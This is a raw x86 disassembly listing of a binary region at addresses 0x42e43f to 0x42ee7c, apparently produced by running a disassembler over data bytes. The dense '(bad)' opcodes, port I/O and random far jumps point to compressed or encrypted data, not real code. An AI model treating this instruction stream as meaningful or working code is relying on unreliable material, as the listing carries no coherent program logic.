  42e43f:	lahf   
  42e440:	ins    DWORD PTR es:[edi],dx
  42e441:	mov    ch,0xf0
  42e443:	repz cmp DWORD PTR [eax+0x78],0x12056ca
  42e44b:	adc    edi,DWORD PTR [esi]
  42e44d:	(bad)
  42e451:	idiv   ebx
  42e453:	mov    ds:0x8239dfb,al
  42e458:	pop    es
  42e459:	out    0x6e,al
  42e45b:	test   al,0x87
  42e45d:	and    DWORD PTR [ecx],esp
  42e45f:	cdq    
  42e460:	xchg   si,ax
  42e462:	push   esp
  42e463:	xor    BYTE PTR [edi-0x1f],dl
  42e466:	add    dl,BYTE PTR [ecx]
  42e468:	mov    edi,0xc22e9942
  42e46d:	pop    edi
	...
  42e4d6:	loop   0x42e495
  42e4d8:	fadd   st(7),st
  42e4da:	(bad)  
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	iret   
  42e4e3:	xchg   ebx,eax
  42e4e4:	repz jmp 0x100:0x1f067
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	mov    ch,dh
  42e4f0:	lds    eax,FWORD PTR [ecx-0x7d69d099]
  42e4f6:	adc    eax,0x1f34a15a
  42e4fb:	xor    eax,0x2c72e6f3
  42e500:	pop    esp
  42e501:	adc    DWORD PTR [ebx-0x4a],ebp
  42e504:	sub    esi,DWORD PTR [ecx-0x788562f8]
  42e50a:	scas   al,BYTE PTR es:[edi]
  42e50b:	and    al,0x5b
  42e50d:	xchg   ebx,eax
  42e50e:	cmc    
  42e50f:	pop    ebp
  42e510:	call   0x4984:0xa40aecdb
  42e517:	mov    ebx,0xe3737798
  42e51c:	in     eax,0x5f
  42e51e:	pop    es
  42e51f:	sbb    eax,0x6edc4d78
  42e524:	push   ebx
  42e525:	mov    ah,0xdb
  42e527:	pop    ss
  42e528:	or     eax,0xce93f24d
  42e52d:	jle    0x42e59b
  42e52f:	clc    
  42e530:	mov    bl,0x24
  42e532:	popa   
  42e533:	(bad)  
  42e534:	mov    eax,0x452f3518
  42e539:	jg     0x42e4ed
  42e53b:	push   esi
  42e53c:	lods   al,BYTE PTR ss:[esi]
  42e53e:	add    ebx,esi
  42e540:	sbb    DWORD PTR [edx+0x638d18f5],ecx
  42e546:	adc    BYTE PTR [edx+0x2f110dfa],0x45
  42e54d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e54e:	rcl    BYTE PTR [edi+0x13b86a7],1
  42e554:	push   ebx
  42e555:	sub    esp,DWORD PTR [ebp-0x65b348ea]
  42e55b:	and    cl,BYTE PTR [edi]
  42e55d:	icebp  
  42e55e:	js     0x42e582
  42e560:	test   BYTE PTR [ebx-0x7],bh
  42e563:	xlat   BYTE PTR ds:[ebx]
  42e564:	mov    ebx,0xaf09e3bb
  42e569:	mov    edi,0xc241acdc
  42e56e:	test   DWORD PTR [ebx],ebx
  42e570:	xchg   edx,eax
  42e571:	outs   dx,BYTE PTR ds:[esi]
  42e572:	xchg   BYTE PTR [esi],ah
  42e574:	dec    edi
  42e575:	mov    dh,0x53
  42e577:	mov    dh,BYTE PTR [edi+0x20152ea5]
  42e57d:	sbb    edi,ebx
  42e57f:	(bad)  
  42e580:	adc    bh,ch
  42e582:	dec    ebp
  42e583:	jge    0x42e514
  42e585:	sbb    DWORD PTR [eax],edi
  42e587:	pop    edi
  42e588:	jne    0x42e5b3
  42e58a:	rcr    BYTE PTR [edi+0x3c0b8c61],1
  42e590:	(bad)  
  42e591:	into   
  42e592:	jge    0x42e553
  42e594:	daa    
  42e595:	jb     0x42e5a7
  42e597:	sti    
  42e598:	scas   eax,DWORD PTR es:[edi]
  42e599:	enter  0x88a9,0xe8
  42e59d:	lock jo 0x42e5f4
  42e5a0:	lea    ebp,[eax+0x11]
  42e5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5a5:	into   
  42e5a6:	pop    es
  42e5a7:	loope  0x42e5e6
  42e5a9:	into   
  42e5aa:	add    dh,BYTE PTR [edx-0x770b8515]
  42e5b0:	std    
  42e5b1:	sbb    BYTE PTR [esi-0x18f628b1],dl
  42e5b7:	sub    eax,0x53bb35ad
  42e5bc:	and    ebx,esi
  42e5be:	enter  0xd086,0x56
  42e5c2:	loop   0x42e5ce
  42e5c4:	jae    0x42e60a
  42e5c6:	dec    ebp
  42e5c7:	adc    edx,DWORD PTR [esi-0x3b]
  42e5ca:	int    0xf3
  42e5cc:	aam    0x4e
  42e5ce:	aam    0x65
  42e5d0:	jp     0x42e599
  42e5d2:	and    BYTE PTR [ebx+ebp*8-0x6aaec904],0x29
  42e5da:	les    eax,FWORD PTR [edx+0xf0fa531]
  42e5e0:	test   BYTE PTR [esi+0x19],ah
  42e5e3:	bound  ecx,QWORD PTR [ecx+0x6621bb35]
  42e5e9:	mov    BYTE PTR [eax+0x61],bl
  42e5ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5ed:	jmp    0x0:0x0
	...
  42e654:	add    BYTE PTR [eax],al
  42e656:	push   ebp
  42e657:	cmp    dh,cl
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	gs fsin 
  42e665:	outs   dx,DWORD PTR ds:[esi]
  42e666:	addr16 icebp 
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	pop    ebp
  42e66f:	mov    al,BYTE PTR [eax+ebp*8]
  42e672:	and    eax,0x7c17a0c3
  42e677:	mov    dl,0x8e
  42e679:	pop    edx
  42e67a:	push   edx
  42e67b:	cmp    edi,ebx
  42e67d:	rcr    BYTE PTR ds:0x55d59cbc,cl
  42e683:	and    esp,DWORD PTR [esi+0x4b]
  42e686:	sbb    BYTE PTR [ecx],cl
  42e688:	ss out dx,al
  42e68a:	adc    dh,BYTE PTR [ecx-0x541729a1]
  42e690:	pusha  
  42e691:	add    esp,edi
  42e693:	or     BYTE PTR [esi],dl
  42e695:	mov    WORD PTR [esi+0x11],es
  42e698:	int    0xed
  42e69a:	inc    esi
  42e69b:	xchg   ecx,eax
  42e69c:	xchg   edx,eax
  42e69d:	cdq    
  42e69e:	fnsave [ebp+ebp*1+0x4b]
  42e6a2:	test   BYTE PTR [ebx+0x4af23dbb],cl
  42e6a8:	mov    DWORD PTR [ebx-0x21],esi
  42e6ab:	push   ds
  42e6ac:	int3   
  42e6ad:	mov    esi,0x41ecdc12
  42e6b2:	imul   ebx,DWORD PTR [edx],0x2a
  42e6b5:	inc    esi
  42e6b6:	into   
  42e6b7:	xchg   ebx,eax
  42e6b8:	mov    esi,0xd0e69bac
  42e6bd:	arpl   WORD PTR [esi-0x4cb28a40],bx
  42e6c3:	icebp  
  42e6c4:	mov    edi,0x53dca9aa
  42e6c9:	and    bl,0xc6
  42e6cc:	jne    0x42e690
  42e6ce:	mov    esp,0x88180cab
  42e6d3:	xor    ebp,eax
  42e6d5:	adc    dh,BYTE PTR [eax-0x77]
  42e6d8:	push   ss
  42e6d9:	xchg   esi,eax
  42e6da:	pop    eax
  42e6db:	or     cl,BYTE PTR [esi]
  42e6dd:	fsub   DWORD PTR [ecx+0x7f]
  42e6e0:	or     eax,0x39bbeed4
  42e6e5:	pop    ss
  42e6e6:	sbb    bh,dh
  42e6e8:	ror    DWORD PTR [ebp-0x4c89b8eb],1
  42e6ee:	int3   
  42e6ef:	jmp    ebx
  42e6f1:	xlat   BYTE PTR ds:[ebx]
  42e6f2:	sbb    al,0x38
  42e6f4:	xchg   edx,eax
  42e6f5:	icebp  
  42e6f6:	inc    ah
  42e6f8:	add    eax,0x46ff874b
  42e6fd:	fwait
  42e6fe:	sbb    DWORD PTR [eax-0x5a],esi
  42e701:	mov    esp,0x79b05a62
  42e706:	call   0x89f8:0xd95552a1
  42e70d:	mov    ah,0x51
  42e70f:	pop    ecx
  42e710:	jmp    0x42e74d
  42e712:	jno    0x42e6db
  42e714:	retf   
  42e715:	mov    ds:0x63a05e28,eax
  42e71a:	icebp  
  42e71b:	ss jns 0x42e78f
  42e71e:	inc    eax
  42e71f:	leave  
  42e720:	call   0x1782:0xfd7ccaa6
  42e727:	sub    eax,0x18b1f05f
  42e72c:	cmp    DWORD PTR [ebx+0x48],edi
  42e72f:	fs jge 0x42e734
  42e732:	mov    cl,BYTE PTR [ebp+ecx*4-0x7d9a8e51]
  42e739:	ficomp DWORD PTR [ebp-0x5543edf8]
  42e73f:	sbb    edx,DWORD PTR [ecx+0x29]
  42e742:	shr    bh,cl
  42e744:	push   ss
  42e745:	icebp  
  42e746:	lds    edi,FWORD PTR [esi+eiz*2+0x52]
  42e74a:	in     al,0xbc
  42e74c:	adc    al,BYTE PTR [edi-0x25937d8e]
  42e752:	pop    edi
  42e753:	or     al,bh
  42e755:	fisttp WORD PTR [edi-0x27]
  42e758:	bound  esi,QWORD PTR [ecx+0x52]
  42e75b:	adc    BYTE PTR [eax-0x2e],cl
  42e75e:	push   esp
  42e75f:	jp     0x42e73d
  42e761:	popf   
  42e762:	inc    edi
  42e763:	adc    BYTE PTR [edx-0x49],bh
  42e766:	sub    ebp,esp
  42e768:	jl     0x42e77f
  42e76a:	popa   
  42e76b:	retf   
  42e76c:	push   edx
  42e76d:	mov    esp,0x0
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	fisubr DWORD PTR [edi]
  42e7e3:	lea    ecx,[ebp+0x22]
  42e7e6:	repnz add DWORD PTR [bx+si],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	add    eax,edi
  42e7f0:	std    
  42e7f1:	shl    DWORD PTR [ebp-0x74345760],1
  42e7f7:	repz mov edi,0x19b360fd
  42e7fd:	or     BYTE PTR [ebp-0x7b0fd643],dh
  42e803:	addr16 clc 
  42e805:	xor    ah,BYTE PTR [edi+0x67]
  42e808:	dec    ecx
  42e809:	jmp    0x9b95dc8a
  42e80e:	jmp    0x8e30ee74
  42e813:	ret    0xa018
  42e816:	inc    eax
  42e817:	dec    ebp
  42e818:	push   0x45420ba9
  42e81d:	leave  
  42e81e:	push   0x10
  42e820:	inc    edi
  42e821:	pusha  
  42e822:	sub    dl,BYTE PTR [esi-0x31]
  42e825:	xor    esi,ebp
  42e827:	mov    esp,0x6d1fb2fe
  42e82c:	pop    ds
  42e82d:	sbb    edx,DWORD PTR [esp+edi*4+0xaea9005]
  42e834:	std    
  42e835:	jnp    0x42e819
  42e837:	cmp    al,0xf7
  42e839:	mov    eax,ds:0x6925034f
  42e83e:	in     eax,dx
  42e83f:	ss jb  0x42e81b
  42e842:	loop   0x42e82c
  42e844:	fisttp QWORD PTR [ebx]
  42e846:	mov    al,ds:0x848e556d
  42e84b:	or     bl,BYTE PTR [edi]
  42e84d:	mov    ds:0x51bf4904,eax
  42e852:	(bad)  
  42e853:	retf   0xb8aa
  42e856:	mov    eax,ds:0x8496baa8
  42e85b:	(bad)  
  42e85c:	dec    ebx
  42e85d:	push   ds
  42e85e:	cli    
  42e85f:	jmp    0xeb56:0xd3902f72
  42e866:	(bad)  
  42e867:	mov    ch,0x11
  42e869:	pop    es
  42e86a:	sbb    BYTE PTR [esi-0x73323062],al
  42e870:	jb     0x42e847
  42e872:	xchg   ebp,eax
  42e873:	inc    esi
  42e874:	pop    edx
  42e875:	in     eax,0xd5
  42e877:	outs   dx,BYTE PTR ds:[esi]
  42e878:	push   cs
  42e879:	nop
  42e87a:	scas   al,BYTE PTR es:[edi]
  42e87b:	in     eax,0xd4
  42e87d:	mov    dl,0x51
  42e87f:	xchg   edx,eax
  42e880:	(bad)  
  42e881:	ret    
  42e882:	stc    
  42e883:	sub    DWORD PTR [eax+0x77],esi
  42e886:	(bad)  
  42e887:	adc    edx,DWORD PTR [esi]
  42e889:	call   0x2af6:0xb3f0d530
  42e890:	dec    eax
  42e891:	mov    BYTE PTR [edi+0x37],al
  42e894:	mov    bl,0xbc
  42e896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e897:	in     eax,dx
  42e898:	add    al,0x7b
  42e89a:	xor    eax,esi
  42e89c:	into   
  42e89d:	jbe    0x42e861
  42e89f:	or     bh,ah
  42e8a1:	sti    
  42e8a2:	es xchg ebp,eax
  42e8a4:	bound  ebx,QWORD PTR ss:[ebx+0x17]
  42e8a8:	mov    WORD PTR [ecx-0x2d],es
  42e8ab:	pop    ebp
  42e8ac:	fdiv   st(7),st
  42e8ae:	aas    
  42e8af:	sbb    eax,0x49cf8d77
  42e8b4:	and    eax,0xfbdd3073
  42e8b9:	push   es
  42e8ba:	retf   
  42e8bb:	dec    ebp
  42e8bc:	leave  
  42e8bd:	jmp    0xd1754a7b
  42e8c2:	ds jne 0x42e847
  42e8c5:	lock in al,dx
  42e8c7:	adc    esp,DWORD PTR [edx]
  42e8c9:	pop    edx
  42e8ca:	bound  esp,QWORD PTR [ebx+0x58]
  42e8cd:	dec    esi
  42e8ce:	jmp    0x42e877
  42e8d0:	mov    edx,0xaffeace0
  42e8d5:	push   cs
  42e8d6:	repnz rol BYTE PTR [ebx],0x6d
  42e8da:	inc    ebx
  42e8db:	repz pop eax
  42e8dd:	lahf   
  42e8de:	xchg   edi,eax
  42e8df:	outs   dx,BYTE PTR ds:[esi]
  42e8e0:	or     DWORD PTR [edx],esp
  42e8e2:	sahf   
  42e8e3:	adc    ebp,DWORD PTR [eax+0x303d37f3]
  42e8e9:	test   BYTE PTR [ebx+esi*8+0x582b],bh
	...
  42e954:	add    BYTE PTR [eax],al
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x48dc07d5]
  42e963:	gs pusha 
  42e965:	add    esp,DWORD PTR [edi-0xd]
  42e968:	add    DWORD PTR [eax],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	cmp    al,0xeb
  42e970:	stos   BYTE PTR es:[edi],al
  42e971:	icebp  
  42e972:	leave  
  42e973:	sbb    ebp,ebp
  42e975:	test   DWORD PTR [eax],ebp
  42e977:	call   0x7bb:0x90ee42d5
  42e97e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42e980:	pop    esp
  42e981:	sub    eax,0x90180aa0
  42e986:	xchg   ebx,eax
  42e987:	push   0xfffffff5
  42e989:	mov    ds:0xe9e88fa,al
  42e98e:	fld    QWORD PTR [edi+0x6ac343b2]
  42e994:	lock pop edi
  42e996:	inc    esi
  42e997:	cmp    ecx,DWORD PTR cs:[edi+edi*1]
  42e99b:	call   0x135fa383
  42e9a0:	cmp    BYTE PTR [edx+0xf],al
  42e9a3:	ret    
  42e9a4:	and    BYTE PTR [ecx],bh
  42e9a6:	or     DWORD PTR [edx],0xba627a88
  42e9ac:	daa    
  42e9ad:	cmp    ebx,eax
  42e9af:	pop    ss
  42e9b0:	push   ds
  42e9b1:	mov    eax,ds:0x2868dcd1
  42e9b6:	push   ss
  42e9b7:	adc    ah,cl
  42e9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9ba:	inc    ecx
  42e9bb:	add    eax,0x4df7ad77
  42e9c0:	or     bl,cl
  42e9c2:	(bad)  
  42e9c3:	(bad)  
  42e9c4:	cmc    
  42e9c5:	jmp    0xe81f986a
  42e9ca:	xlat   BYTE PTR ds:[ebx]
  42e9cb:	sbb    al,0x1e
  42e9cd:	jmp    0x3d3d:0x852d04cd
  42e9d4:	repz cmp DWORD PTR [eax+0x6a5fbdd5],ecx
  42e9db:	inc    ecx
  42e9dc:	iret   
  42e9dd:	jl     0x42e992
  42e9df:	int    0xff
  42e9e1:	ins    DWORD PTR es:[edi],dx
  42e9e2:	cmp    edi,DWORD PTR [ebx-0x44]
  42e9e5:	pop    ebp
  42e9e6:	xchg   ebx,eax
  42e9e7:	add    al,0xf0
  42e9e9:	in     al,dx
  42e9ea:	test   BYTE PTR [edi-0x5e],bl
  42e9ed:	test   bh,0x9d
  42e9f0:	push   eax
  42e9f1:	mov    edi,0xecc66601
  42e9f6:	jle    0x42ea26
  42e9f8:	pop    ds
  42e9f9:	sbb    eax,0xeef5ddb7
  42e9fe:	out    0x74,eax
  42ea00:	mov    ds:0xe7955455,eax
  42ea05:	pop    esi
  42ea06:	cld    
  42ea07:	cmp    edx,DWORD PTR [edx-0x4f]
  42ea0a:	and    eax,0x94e26e16
  42ea0f:	mov    bh,0x60
  42ea11:	ja     0x42e9fb
  42ea13:	sub    ecx,DWORD PTR [ebp+0x63c71920]
  42ea19:	packssdw mm7,QWORD PTR [eax-0x585e5f0d]
  42ea20:	sub    ebp,DWORD PTR [esi+0x4a]
  42ea23:	loop   0x42e9c9
  42ea25:	pmulhuw mm5,QWORD PTR [eax+0x56230baf]
  42ea2c:	pop    ds
  42ea2d:	add    DWORD PTR [edx],0x92e4ce58
  42ea33:	push   ds
  42ea34:	inc    ebx
  42ea35:	dec    ebx
  42ea37:	jmp    0x42e9d8
  42ea39:	inc    esi
  42ea3a:	jg     0x42e9eb
  42ea3c:	xchg   edi,eax
  42ea3d:	jmp    0x29252f18
  42ea42:	sub    DWORD PTR [ecx+0x68e16a8a],edx
  42ea48:	lods   eax,DWORD PTR ds:[esi]
  42ea49:	jmp    0xd57a:0x912a
  42ea4f:	sbb    esp,DWORD PTR [esi-0x6e3161cd]
  42ea55:	dec    edi
  42ea56:	mov    DWORD PTR [ebx+esi*8],ebx
  42ea59:	sbb    eax,0xbeba5f9a
  42ea5e:	fsubr  DWORD PTR [ebp-0x815b0ff]
  42ea64:	and    edi,edi
  42ea66:	mov    bh,0x96
  42ea68:	mov    eax,0xf444ecdd
  42ea6d:	hlt    
	...
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	ds adc al,0xa6
  42eae5:	pop    ecx
  42eae6:	addr16 hlt 
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	test   al,0xbc
  42eaf0:	mov    ah,0xd9
  42eaf2:	adc    eax,0x3e29218a
  42eaf7:	repnz dec ecx
  42eaf9:	rol    bl,cl
  42eafb:	clc    
  42eafc:	xchg   ecx,eax
  42eafd:	ret    
  42eafe:	popf   
  42eaff:	leave  
  42eb00:	retf   
  42eb01:	cmp    eax,0x81e8dea0
  42eb06:	pop    ss
  42eb07:	shr    ch,0x8b
  42eb0a:	retf   0xcd50
  42eb0d:	or     al,0x5
  42eb0f:	out    dx,al
  42eb10:	mov    dh,0x48
  42eb12:	xchg   DWORD PTR [eax-0xf48a88e],ebx
  42eb18:	dec    edx
  42eb19:	rcl    BYTE PTR [ecx],0x0
  42eb1c:	dec    ebx
  42eb1d:	lods   eax,DWORD PTR ds:[esi]
  42eb1e:	mov    dl,0x75
  42eb20:	mov    BYTE PTR [esi+eiz*8],bh
  42eb23:	loope  0x42eb98
  42eb25:	ret    
  42eb26:	mov    ah,dh
  42eb28:	ret    
  42eb29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb2b:	xor    BYTE PTR ss:[edx],ch
  42eb2e:	(bad)  [ebx-0x36c2100c]
  42eb34:	retf   0xb97a
  42eb37:	dec    ecx
  42eb38:	out    0x18,eax
  42eb3a:	cmp    eax,0x342d7e5f
  42eb3f:	push   ebp
  42eb40:	adc    edx,DWORD PTR [ecx-0x5a]
  42eb43:	out    dx,al
  42eb44:	out    0x47,eax
  42eb46:	inc    eax
  42eb47:	lock mov edx,0xf93c1136
  42eb4d:	inc    edi
  42eb4e:	int3   
  42eb4f:	mov    dh,0xed
  42eb52:	lods   al,BYTE PTR ds:[esi]
  42eb53:	sub    al,0xcb
  42eb55:	in     al,0x9e
  42eb57:	hlt    
  42eb58:	sbb    edi,DWORD PTR [ebx]
  42eb5a:	sbb    al,0xde
  42eb5c:	xor    cl,BYTE PTR [edx-0x53863e2b]
  42eb62:	or     eax,0x72afdc46
  42eb67:	cmp    eax,0xd132fb70
  42eb6c:	(bad)  
  42eb6d:	mov    es,WORD PTR [edx+0x48]
  42eb70:	push   ecx
  42eb71:	push   esi
  42eb72:	push   ebx
  42eb73:	mov    ds:0xf3925ae2,al
  42eb78:	and    bh,BYTE PTR [ebp-0x55]
  42eb7b:	jne    0x42ebe9
  42eb7d:	push   ss
  42eb7e:	sub    eax,0x497d33b6
  42eb83:	push   0x85ed7349
  42eb88:	jge    0x42eb6f
  42eb8a:	out    0xb3,al
  42eb8c:	fnstenv [eax-0x74]
  42eb8f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb91:	shl    DWORD PTR [ecx+edx*2-0x69],cl
  42eb95:	out    dx,eax
  42eb96:	repnz test BYTE PTR [edx],dh
  42eb99:	xchg   BYTE PTR [edi-0x20f5e176],ah
  42eb9f:	or     DWORD PTR [ecx],ebx
  42eba1:	les    esi,FWORD PTR [esi+0x3b]
  42eba4:	xchg   esp,eax
  42eba5:	js     0x42ebae
  42eba7:	xchg   edx,eax
  42eba8:	push   ds
  42eba9:	ss ja  0x42ebd1
  42ebac:	mov    al,ds:0x4dfda49a
  42ebb1:	rcr    edx,1
  42ebb3:	sub    DWORD PTR [eax+0x397c6b3d],eax
  42ebb9:	dec    esp
  42ebba:	mov    bh,0x48
  42ebbc:	mov    al,ds:0x22385227
  42ebc1:	or     dh,BYTE PTR [edi-0x4a241e77]
  42ebc7:	ins    BYTE PTR es:[edi],dx
  42ebc8:	ja     0x42ebf2
  42ebca:	out    dx,al
  42ebcb:	jle    0x42ec39
  42ebcd:	dec    ebp
  42ebce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebcf:	push   ss
  42ebd0:	lock xchg ebx,eax
  42ebd2:	sub    eax,0x7360f68b
  42ebd7:	fld    QWORD PTR [ecx+0x31]
  42ebda:	xchg   edi,eax
  42ebdb:	push   edi
  42ebdc:	mov    bh,0xdd
  42ebde:	cmp    eax,0x914883ea
  42ebe3:	jmp    0x42eb87
  42ebe5:	push   0x26a84fe2
  42ebea:	add    esi,edx
  42ebec:	sub    al,0xa
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	and    DWORD PTR [edx],0x6752f160
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	cli    
  42ec6f:	dec    ebp
  42ec70:	or     esi,DWORD PTR ds:0x6a511686
  42ec76:	(bad)  [ebp-0x5e520786]
  42ec7c:	js     0x42ecdc
  42ec7e:	ret    
  42ec7f:	dec    esp
  42ec80:	int3   
  42ec81:	ins    DWORD PTR es:[edi],dx
  42ec82:	jmp    0xb90c:0xc500de94
  42ec89:	fs (bad) 
  42ec8b:	pop    edx
  42ec8c:	pop    edx
  42ec8d:	in     al,0x23
  42ec8f:	stc    
  42ec90:	dec    edx
  42ec91:	or     ch,BYTE PTR [eax+0x16]
  42ec94:	lock add al,0x19
  42ec97:	xor    al,0x7e
  42ec99:	dec    esp
  42ec9a:	dec    eax
  42ec9b:	jo     0x42eceb
  42ec9d:	jno    0x42ecbc
  42ec9f:	pop    edx
  42eca0:	xchg   edi,eax
  42eca1:	jno    0x42ec84
  42eca3:	pusha  
  42eca4:	nop
  42eca5:	fwait
  42eca6:	imul   esi,DWORD PTR [edx*2+0xf3b0c69],0xffffffe9
  42ecae:	jne    0x42ec91
  42ecb0:	repnz imul ebp,DWORD PTR [edi+0x7fc2f0ba],0xffffffb3
  42ecb8:	pop    ebp
  42ecb9:	test   DWORD PTR [edx+0xf],0x3b2ccac2
  42ecc0:	dec    edi
  42ecc1:	shl    BYTE PTR [ecx+0x3e75b2ef],1
  42ecc7:	mov    dl,0xa3
  42ecc9:	and    ecx,edi
  42eccb:	mov    edx,0x42477d70
  42ecd0:	push   esi
  42ecd1:	cdq    
  42ecd2:	nop
  42ecd3:	sub    dl,BYTE PTR [ebp+0x59]
  42ecd6:	and    ebx,DWORD PTR [eax+0x35a8eae0]
  42ecdc:	xchg   edi,eax
  42ecdd:	xchg   edx,eax
  42ecde:	xor    BYTE PTR [ebp+0x57],dh
  42ece1:	pop    es
  42ece2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ece3:	push   ebx
  42ece4:	xor    ch,BYTE PTR [esi]
  42ece6:	mov    dl,0x0
  42ece8:	sbb    esi,DWORD PTR [ebx+edi*1+0x62]
  42ecec:	adc    edx,DWORD PTR [eax+0x23fa49bc]
  42ecf2:	dec    ebx
  42ecf3:	into   
  42ecf4:	shl    DWORD PTR [eax-0x58],cl
  42ecf7:	mov    esp,0xd5140dba
  42ecfc:	les    esp,FWORD PTR [edi+edi*8+0x22218c84]
  42ed03:	mov    ch,0xa
  42ed05:	mov    ebx,0x4ea8189f
  42ed0a:	scas   al,BYTE PTR es:[edi]
  42ed0b:	lahf   
  42ed0c:	scas   al,BYTE PTR es:[edi]
  42ed0d:	sbb    al,0x43
  42ed0f:	xchg   ebx,eax
  42ed10:	jge    0x42ed3c
  42ed12:	xchg   BYTE PTR ds:0xd6fbc3f5,ah
  42ed18:	add    BYTE PTR [edi+0x62],dl
  42ed1b:	jmp    0xd0af:0xe91952a7
  42ed22:	gs inc esp
  42ed24:	sub    ebp,DWORD PTR [edx+esi*4]
  42ed27:	outs   dx,BYTE PTR ds:[esi]
  42ed28:	test   eax,0x33e0e0f
  42ed2d:	fild   QWORD PTR [esi-0x323e432]
  42ed33:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed35:	dec    ebx
  42ed36:	fwait
  42ed37:	sbb    eax,0x749d2412
  42ed3c:	ret    0x41ff
  42ed3f:	ret    
  42ed40:	lock and eax,0x5aa128ae
  42ed46:	pop    ebx
  42ed47:	dec    esi
  42ed48:	into   
  42ed49:	xchg   esp,eax
  42ed4a:	push   esp
  42ed4b:	fcom   DWORD PTR [eax-0x9]
  42ed4e:	push   cs
  42ed4f:	cmp    al,BYTE PTR [ecx-0x64]
  42ed52:	adc    esi,ebp
  42ed54:	pusha  
  42ed55:	sub    ecx,ebp
  42ed57:	mov    esp,0x4a09294f
  42ed5c:	rcr    BYTE PTR [ebp-0x2543361f],0x3
  42ed63:	push   0x59
  42ed65:	rol    dh,1
  42ed67:	mov    bh,0x13
  42ed69:	pop    esp
  42ed6a:	in     eax,0xea
  42ed6c:	xor    eax,0x61
	...
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp-0x49a0c65e]
  42ede5:	pusha  
  42ede6:	test   BYTE PTR [bx+di],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	sbb    ecx,0x5c
  42edf1:	jnp    0x42edd7
  42edf3:	push   edi
  42edf4:	addr16 mov edx,0x965c5c00
  42edfa:	and    eax,0xabac0ac6
  42edff:	(bad)
  42ee02:	dec    esi
  42ee03:	xor    esi,ebp
  42ee05:	cmp    BYTE PTR [esp],dh
  42ee08:	out    0xea,eax
  42ee0a:	je     0x42ee1b
  42ee0c:	jg     0x42ee03
  42ee0e:	sub    eax,0x2eec363a
  42ee13:	jmp    0x42edb3
  42ee15:	inc    ebp
  42ee16:	fld    DWORD PTR [ebx+esi*4+0x17]
  42ee1a:	add    al,0xfd
  42ee1c:	dec    ecx
  42ee1d:	popa   
  42ee1e:	cld    
  42ee1f:	xor    BYTE PTR [ebp+edi*8+0x36],0xde
  42ee24:	cmp    eax,ebp
  42ee26:	sti    
  42ee27:	ror    edx,0x8c
  42ee2a:	pop    ecx
  42ee2b:	fisub  WORD PTR [esi]
  42ee2d:	lock push esi
  42ee2f:	mov    ds:0x87020500,al
  42ee34:	sub    ch,BYTE PTR [ecx-0x742dbe69]
  42ee3a:	pop    es
  42ee3b:	test   al,0x90
  42ee3d:	xchg   esp,eax
  42ee3e:	stos   DWORD PTR es:[edi],eax
  42ee3f:	mov    cl,bh
  42ee41:	add    ch,cl
  42ee43:	cmp    al,0x75
  42ee45:	fldcw  WORD PTR [eax]
  42ee47:	adc    eax,0x48b889bb
  42ee4c:	and    ah,BYTE PTR [ebx-0x29]
  42ee4f:	shr    BYTE PTR [esi+0x30],1
  42ee52:	cmp    eax,0x83c97853
  42ee57:	or     edx,DWORD PTR [edi+edx*1-0x3a]
  42ee5b:	popa   
  42ee5c:	popf   
  42ee5d:	jmp    0xd200:0xdf2133f0
  42ee64:	jge    0x42ee91
  42ee66:	inc    esi
  42ee67:	xor    al,0x97
  42ee69:	pop    ecx
  42ee6a:	es push ebp
  42ee6c:	lods   al,BYTE PTR ds:[esi]
  42ee6d:	mov    edx,0x9b2cb69
  42ee72:	jae    0x42eed2
  42ee74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee75:	inc    ecx
  42ee76:	(bad)  
  42ee77:	(bad)  
  42ee78:	js     0x42ee06
  42ee7a:	xchg   BYTE PTR [edi],al
  42ee7c:	ins    DWORD PTR es:[edi],dx
